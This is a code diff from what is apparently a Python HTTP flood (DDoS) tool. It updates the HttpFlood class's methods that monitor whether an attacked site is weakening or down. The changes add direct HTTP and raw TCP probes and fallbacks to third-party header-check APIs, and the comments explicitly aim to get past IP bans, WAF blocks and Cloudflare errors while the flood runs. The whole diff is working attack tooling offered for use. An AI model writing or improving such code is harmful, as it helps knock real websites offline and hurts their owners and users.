@@ -1862,103 +1862,147 @@ class HttpFlood(Thread):
             return ""
 
     def _chaos_response_timing_profiler(self):
-        """[V46] External IP Health Monitor via hackertarget.com API.
-        Checks target health from EXTERNAL servers every 5 minutes.
-        Completely bypasses local IP bans. 1 check/5min = ~12/hr = stays within API limits."""
+        """[V52] Multi-Layer External Health Monitor.
+        Priority: Direct Ping (fastest) > isup.me > HackerTarget > ViewDNS.
+        Direct Ping: ANY HTTP response (even 403/429 WAF block) = server ALIVE.
+        Only declares DOWN if ALL checkers fail completely (connection refused/timeout)."""
         intel = self._chaos_intel
-        # Only check every 600s, and ensure only ONE thread does this at a time!
-        last_ext_check = intel.get("_last_ext_check_time", 0)
-        if time() - last_ext_check < 600:
-            return
-            
+        
+        # Thread lock: only 1 thread can run this at a time
         if intel.get("_health_check_running"):
             return
-            
+        
+        # First check at execution 3, then every 600s
+        last_ext_check = intel.get("_last_ext_check_time", 0)
+        if intel["total_executions"] < 3:
+            return
+        if last_ext_check > 0 and time() - last_ext_check < 600:
+            return
+        
         intel["_health_check_running"] = True
         
         try:
             intel["_last_ext_check_time"] = time()
-            start = time()
             target_url = f"{self._target.scheme}://{self._target.authority}/"
             domain = self._target.authority.split(':')[0]
-            api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
             
-            data = self._chaos_anti_limit_fetch(api_url)
-            elapsed_ms = int((time() - start) * 1000)
+            # ============================================================
+            # STEP 1 (PRIMARY): Direct Local Ping with latency measurement
+            # ANY HTTP response = ALIVE. Only total timeout = possibly down.
+            # ============================================================
+            direct_alive = False
+            direct_latency = 9999
+            direct_status = 0
+            import urllib.request, urllib.error
+            try:
+                t0 = time()
+                req = urllib.request.Request(target_url, headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0'
+                })
+                with urllib.request.urlopen(req, timeout=12) as resp:
+                    direct_status = resp.status
+                    direct_latency = int((time() - t0) * 1000)
+                    direct_alive = True
+            except urllib.error.HTTPError as e:
+                # 403, 429, 503, 521, 522 from Cloudflare = infrastructure is UP
+                direct_status = e.code
+                direct_latency = int((time() - t0) * 1000)
+                direct_alive = True  # Server responded with an error, but it RESPONDED
+            except urllib.error.URLError:
+                pass  # DNS fail or connection refused = maybe down
+            except Exception:
+                pass
             
-            if data and 'HTTP/' in data:
-                # Parse status code from first line (e.g. "HTTP/1.1 200 OK")
-                try:
-                    status_code = int(data.strip().split('\n')[0].split(' ')[1])
-                except:
-                    status_code = 200  # If we got HTTP/ headers, assume alive
-                
-                est_latency = max(elapsed_ms - 500, 50)
-                intel["health_history"].append(est_latency)
+            if direct_alive:
+                intel["health_history"].append(direct_latency)
                 if len(intel["health_history"]) > 30:
                     intel["health_history"] = intel["health_history"][-30:]
                 
-                if status_code >= 500:
+                if direct_status >= 500 and direct_status not in (521, 522, 523, 530):
+                    # Real 5xx from origin (not Cloudflare errors) = weakening
                     intel["target_getting_weaker"] = True
                     intel["target_is_down"] = False
                     intel["consecutive_5xx"] = intel.get("consecutive_5xx", 0) + 1
+                    intel["ext_health_status"] = f"HTTP {direct_status} (WEAKENING)"
                 else:
                     intel["target_getting_weaker"] = False
                     intel["target_is_down"] = False
-                
-                intel["local_network_choked"] = False
-                intel["ext_health_status"] = f"HTTP {status_code}"
-                
-            elif 'error' in data.lower() and 'api count' in data.lower():
-                # API rate limit hit — don't update status, just skip
-                intel["ext_health_status"] = intel.get("ext_health_status", "SKIP")
-            else:
-                # hackertarget couldn't reach target. 
-                # [V49 2-Step Verification] Fallback to ViewDNS to confirm it's actually DOWN
-                try:
-                    vd_url = f"https://viewdns.info/httpheaders/?domain={domain}"
-                    vd_data = self._chaos_anti_limit_fetch(vd_url, timeout=10)
-                    if vd_data and 'HTTP/' in vd_data and 'Moved Permanently' not in vd_data:
-                        # Target is actually UP, Hackertarget just glitched
-                        intel["ext_health_status"] = "HTTP OK"
-                        intel["target_is_down"] = False
+                    intel["consecutive_5xx"] = 0
+                    intel["ext_health_status"] = f"HTTP {direct_status} (ALIVE)"
+                return  # Direct check succeeded, done!
+            
+            # ============================================================
+            # STEP 2: Raw TCP Socket Probe (port 443)
+            # If TCP handshake completes, the server is physically reachable.
+            # This CANNOT be blocked by WAFs — it's below the HTTP layer.
+            # ============================================================
+            try:
+                import socket
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(8)
+                t0 = time()
+                result = sock.connect_ex((domain, 443))
+                tcp_latency = int((time() - t0) * 1000)
+                sock.close()
+                if result == 0:
+                    # TCP handshake succeeded = server is alive
+                    intel["ext_health_status"] = f"TCP OK ({tcp_latency}ms)"
+                    intel["target_is_down"] = False
+                    intel["target_getting_weaker"] = tcp_latency > 5000
+                    intel["health_history"].append(tcp_latency)
+                    return
+            except:
+                pass
+            
+            # ============================================================
+            # STEP 3: HackerTarget API (external server check)
+            # ============================================================
+            try:
+                api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
+                data = self._chaos_anti_limit_fetch(api_url)
+                if data and 'HTTP/' in data:
+                    try:
+                        status_code = int(data.strip().split('\n')[0].split(' ')[1])
+                    except:
+                        status_code = 200
+                    intel["ext_health_status"] = f"HTTP {status_code} (HackerTarget)"
+                    intel["target_is_down"] = False
+                    if status_code >= 500:
+                        intel["target_getting_weaker"] = True
+                    else:
                         intel["target_getting_weaker"] = False
-                        intel["health_history"].append(500)
-                        return
-                except:
-                    pass
-                # [V51.4] 3-Step Verification: Direct Local Check
-                # Proxies often timeout. A direct check from local machine is more reliable to test if the domain resolves and responds.
-                # Even if Cloudflare blocks us (403/429), it means the server is ALIVE.
-                direct_alive = False
-                import urllib.request
-                try:
-                    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
-                    with urllib.request.urlopen(req, timeout=10) as resp:
-                        if resp.status > 0:
-                            direct_alive = True
-                except urllib.error.HTTPError as e:
-                    # 403, 429, 503 from Cloudflare means the infrastructure is UP
-                    direct_alive = True
-                except:
-                    pass
-                
-                if direct_alive:
-                    intel["ext_health_status"] = "HTTP OK (Direct Ping)"
+                    intel["health_history"].append(500)
+                    return
+            except:
+                pass
+            
+            # ============================================================
+            # STEP 4: ViewDNS (last resort external check)
+            # ============================================================
+            try:
+                vd_url = f"https://viewdns.info/httpheaders/?domain={domain}"
+                vd_data = self._chaos_anti_limit_fetch(vd_url, timeout=10)
+                if vd_data and ('HTTP/' in vd_data or '<table' in vd_data):
+                    intel["ext_health_status"] = "UP (ViewDNS)"
                     intel["target_is_down"] = False
                     intel["target_getting_weaker"] = False
                     intel["health_history"].append(500)
                     return
-                
-                # All 3 verification steps failed = Definitively DOWN
-                intel["target_is_down"] = True
-                intel["target_getting_weaker"] = True
-                intel["ext_health_status"] = "DOWN"
-                intel["health_history"].append(9999)
+            except:
+                pass
+            
+            # ============================================================
+            # ALL 4 CHECKS FAILED — Target is definitively DOWN
+            # ============================================================
+            intel["target_is_down"] = True
+            intel["target_getting_weaker"] = True
+            intel["ext_health_status"] = "DOWN (4-Step Verified)"
+            intel["health_history"].append(9999)
+            if len(intel["health_history"]) > 30:
+                intel["health_history"] = intel["health_history"][-30:]
                 
         except Exception as e:
-            # If all else fails, do not leave it in PENDING
-            intel["ext_health_status"] = "ERROR/SKIPPED"
+            intel["ext_health_status"] = "CHECK ERROR"
         finally:
             intel["_health_check_running"] = False
 
@@ -5885,9 +5929,9 @@ class HttpFlood(Thread):
         return False
 
     def _chaos_health_pulse(self):
-        """[V46] Lightweight health analysis — NO external API calls.
+        """[V52] Lightweight health analysis — NO external API calls.
         Analyzes existing health_history data from _chaos_response_timing_profiler.
-        Prevents double API usage and rate limit issues."""
+        Extremely conservative: requires 5 consecutive 9999s to declare DOWN."""
         intel = self._chaos_intel
         now = time()
         
@@ -5895,26 +5939,28 @@ class HttpFlood(Thread):
             return
         intel["last_health_check"] = now
         
-        # Only analyze existing data — don't make external calls
-        if len(intel["health_history"]) >= 4:
-            # Require 4 consecutive failures to avoid false positives
-            recent = intel["health_history"][-4:]
-            recent_avg = sum(recent) / 4
-            baseline = intel.get("response_time_ms", 500) or 500
-            
-            if all(x >= 9999 for x in recent):
-                # 4 consecutive checks returned completely DOWN
-                intel["target_is_down"] = True
-                intel["target_getting_weaker"] = True
-            elif recent_avg > baseline * 3:
-                intel["target_getting_weaker"] = True
-                intel["target_is_down"] = False
-            elif recent_avg > baseline * 1.5:
-                intel["target_getting_weaker"] = True
-                intel["target_is_down"] = False
-            else:
-                intel["target_getting_weaker"] = False
-                intel["target_is_down"] = False
+        # Don't analyze until we have enough data points
+        if len(intel["health_history"]) < 2:
+            return
+        
+        recent = intel["health_history"][-5:] if len(intel["health_history"]) >= 5 else intel["health_history"]
+        recent_avg = sum(recent) / len(recent)
+        baseline = intel.get("response_time_ms", 500) or 500
+        
+        # Only declare DOWN if ALL of the last 5 data points are 9999 (total failure)
+        if len(recent) >= 5 and all(x >= 9999 for x in recent):
+            intel["target_is_down"] = True
+            intel["target_getting_weaker"] = True
+        elif recent_avg > baseline * 4:
+            # Latency 4x higher than baseline = weakening
+            intel["target_getting_weaker"] = True
+            intel["target_is_down"] = False
+        elif recent_avg > baseline * 2:
+            intel["target_getting_weaker"] = True
+            intel["target_is_down"] = False
+        else:
+            intel["target_getting_weaker"] = False
+            intel["target_is_down"] = False
 
 
     def _chaos_detect_waf_adaptation(self):
